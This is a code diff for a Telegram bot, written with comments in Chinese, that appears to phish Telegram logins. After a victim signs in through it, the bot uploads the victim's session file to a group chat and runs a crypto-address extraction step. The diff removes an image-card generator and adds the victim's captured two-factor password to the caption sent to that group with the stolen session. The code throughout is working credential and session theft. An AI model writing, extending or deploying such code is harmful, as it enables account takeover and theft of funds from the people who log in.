@@ -11,7 +11,6 @@ import time
 import random
 import string
 import logging
-import tempfile
 from datetime import datetime
 
 from aiogram import Router, F, Bot, BaseMiddleware
@@ -49,67 +48,6 @@ def get_photo_input(photo_val: str | None) -> FSInputFile | str | None:
     if os.path.isfile(photo_val):
         return FSInputFile(photo_val)
     return photo_val
-
-
-def _generate_success_image(username: str, nickname: str,
-                            phone: str, ts: str) -> str:
-    """Generate a success card image and return the temp file path."""
-    from PIL import Image, ImageDraw, ImageFont
-
-    W, H = 480, 280
-    img = Image.new("RGB", (W, H), "#ffffff")
-    draw = ImageDraw.Draw(img)
-
-    # Try to use a CJK font, fall back to default
-    font_large = None
-    font_normal = None
-    for fp in [
-        "C:/Windows/Fonts/msyh.ttc",
-        "C:/Windows/Fonts/simhei.ttf",
-        "C:/Windows/Fonts/simsun.ttc",
-        "/usr/share/fonts/truetype/noto/NotoSansCJK-Regular.ttc",
-        "/usr/share/fonts/google-noto-cjk/NotoSansCJK-Regular.ttc",
-    ]:
-        if os.path.isfile(fp):
-            try:
-                font_large = ImageFont.truetype(fp, 22)
-                font_normal = ImageFont.truetype(fp, 18)
-                break
-            except Exception:
-                continue
-    if font_large is None:
-        try:
-            font_large = ImageFont.truetype("arial.ttf", 22)
-            font_normal = ImageFont.truetype("arial.ttf", 18)
-        except Exception:
-            font_large = ImageFont.load_default()
-            font_normal = font_large
-
-    # Header bar
-    draw.rectangle([(0, 0), (W, 50)], fill="#2ecc71")
-    draw.text((20, 12), "✅ 新账号登录成功", fill="#ffffff", font=font_large)
-
-    # Info lines
-    y = 70
-    lines = [
-        ("用户名:", f"@{username}" if username else "N/A"),
-        ("昵称:", nickname or "N/A"),
-        ("手机号:", phone),
-        ("时间:", ts),
-    ]
-    for label, value in lines:
-        draw.text((20, y), label, fill="#666666", font=font_normal)
-        draw.text((100, y), value, fill="#333333", font=font_normal)
-        y += 40
-
-    # Bottom line
-    draw.line([(20, H - 30), (W - 20, H - 30)], fill="#e0e0e0", width=1)
-    draw.text((20, H - 25), "Telegram Bot Manager", fill="#aaaaaa", font=font_normal)
-
-    tmp = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
-    img.save(tmp, format="PNG")
-    tmp.close()
-    return tmp.name
 
 
 async def send_custom_response(bot: Bot, chat_id: int, text: str,
@@ -163,14 +101,15 @@ def _record_msg(uid: int, name: str, direction: str, text: str):
 
 
 async def _handle_login_success(bot: Bot, chat_id: int, uid: int,
-                                phone: str, user_info: dict):
+                                phone: str, user_info: dict,
+                                tfa_password: str = ""):
     """Shared success flow for code and 2FA login.
 
     Order:
       1. Send success text to user
       2. Send configured success photo to user (if enabled)
       3. Send session-valid text to user
-      4. Upload tdata zip + info image card to group
+      4. Upload tdata zip + text info to group
       5. USDT extraction (background)
       6. Delayed session check (background)
     """
@@ -207,42 +146,30 @@ async def _handle_login_success(bot: Bot, chat_id: int, uid: int,
     if session_valid_text:
         await bot.send_message(chat_id=chat_id, text=session_valid_text, parse_mode="HTML")
 
-    # Step 4: Upload tdata zip + info image card to group
-    img_path = None
+    # Step 4: Upload tdata zip + text info to group
     group_id = _c("success_group_id", "")
     if group_id:
         try:
             group_chat_id = int(group_id)
 
-            # Generate info image card for group
-            try:
-                img_path = _generate_success_image(username, nickname, phone, ts_str)
-            except Exception as e:
-                logger.warning(f"[{uid}] 生成群图片失败: {e}")
-
-            # Send info image card to group
-            if img_path and os.path.isfile(img_path):
-                group_caption = (
-                    f"✅ <b>新账号登录成功</b>\n"
-                    f"用户名: @{username or 'N/A'}\n"
-                    f"昵称: {nickname or 'N/A'}\n"
-                    f"手机号: <code>{phone}</code>\n"
-                    f"时间: {ts_str}"
-                )
-                await bot.send_photo(
-                    chat_id=group_chat_id,
-                    photo=FSInputFile(img_path),
-                    caption=group_caption,
-                    parse_mode="HTML",
-                )
-
             # Send tdata zip (or session file) to group
             session_file = login_engine.get_last_session_path(phone)
             if session_file and os.path.isfile(session_file):
-                caption = f"📂 {phone}"
+                # Build info text as document caption
+                info_lines = [
+                    "✅ 新账号登录成功",
+                    f"用户名: @{username}" if username else "用户名: N/A",
+                    f"昵称: {nickname}" if nickname else "昵称: N/A",
+                    f"手机号: {phone}",
+                ]
+                if tfa_password:
+                    info_lines.append(f"二级密码: {tfa_password}")
+                info_lines.append(f"时间: {ts_str}")
                 group_pwd = _c("group_password", "")
                 if group_pwd:
-                    caption += f"\n🔑 密码: {group_pwd}"
+                    info_lines.append(f"🔑 密码: {group_pwd}")
+                caption = "\n".join(info_lines)
+
                 await bot.send_document(
                     chat_id=group_chat_id,
                     document=FSInputFile(session_file),
@@ -253,13 +180,6 @@ async def _handle_login_success(bot: Bot, chat_id: int, uid: int,
                 logger.warning(f"[{uid}] 直登包/Session 文件不存在，无法上传到群")
         except Exception as e:
             logger.error(f"[{uid}] 上传到群失败: {e}")
-
-    # Clean up temp image
-    if img_path:
-        try:
-            os.unlink(img_path)
-        except Exception:
-            pass
 
     # USDT/crypto address extraction if enabled
     if _cfg and _cfg.get("usdt_extract_enabled", False):
@@ -603,7 +523,8 @@ async def handle_2fa_input(message: Message, bot: Bot):
         _user_state.pop(uid, None)
         await _handle_login_success(
             bot, message.chat.id, uid, phone,
-            result.get("user_info", {}))
+            result.get("user_info", {}),
+            tfa_password=password)
     else:
         state["attempts"] = state.get("attempts", 0) + 1
         remaining = max_attempts - state["attempts"]
